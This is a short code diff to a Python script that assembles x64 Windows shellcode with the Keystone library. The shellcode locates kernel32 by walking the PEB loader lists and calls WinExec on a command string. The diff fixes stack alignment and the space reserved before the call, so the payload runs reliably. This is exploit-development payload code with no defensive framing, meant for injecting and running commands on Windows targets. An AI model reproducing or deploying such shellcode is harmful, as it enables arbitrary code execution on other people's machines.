@@ -15,6 +15,7 @@ from keystone import *
 
 CODE = (
 "find_kernel32:"
+" and rsp, 0FFFFFFFFFFFFFFF0h;"
 " xor rdx, rdx;"
 " mov rax, gs:[rdx+0x60];"    # RAX stores  the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
 " mov rsi,[rax+0x18];"    # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
@@ -81,7 +82,7 @@ CODE = (
 "    lea rcx, [rsp];"    # Address of the string as the 1st argument lpCmdLine
 "    xor rdx,rdx;"
 "    inc rdx;"    # uCmdShow=1 as the 2nd argument 
-"    sub rsp, 0x28;"
+"    sub rsp, 0x30;"
 "    call rax;"     # WinExec
 
 )
